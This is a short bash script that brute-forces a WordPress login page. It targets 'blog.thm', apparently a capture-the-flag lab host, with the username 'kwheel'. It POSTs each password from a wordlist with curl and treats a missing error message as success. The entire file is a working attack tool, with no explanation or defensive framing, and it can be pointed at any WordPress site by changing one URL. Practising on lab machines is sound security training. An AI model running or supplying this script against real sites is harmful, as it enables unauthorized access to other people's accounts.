#!/bin/bash

# Target URL
URL="http://blog.thm/wp-login.php"

# Valid Username
USERNAME="kwheel"

# Password List File
PASSWORD_LIST="passwords.txt"

# Check if the password list exists
if [ ! -f "$PASSWORD_LIST" ]; then
    echo "[!] Password list file not found!"
    exit 1
fi

echo "[*] Starting brute-force attack on $URL with username: $USERNAME"

# Loop through each password in the list
while read -r PASSWORD; do
    echo "[*] Trying password: $PASSWORD"
    
    # Send HTTP POST request and capture the response
    RESPONSE=$(curl -s -X POST "$URL" \
        -d "log=$USERNAME&pwd=$PASSWORD&wp-submit=Log In" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    # Check if the error message is present in the response
    if [[ "$RESPONSE" =~ "The password you entered for the username" ]]; then
        echo "[-] Incorrect password: $PASSWORD"
    else
        echo "[+] SUCCESS! Password found: $PASSWORD"
        exit 0
    fi

done < "$PASSWORD_LIST"

echo "[!] Brute-force attack finished. No valid password found."
exit 1
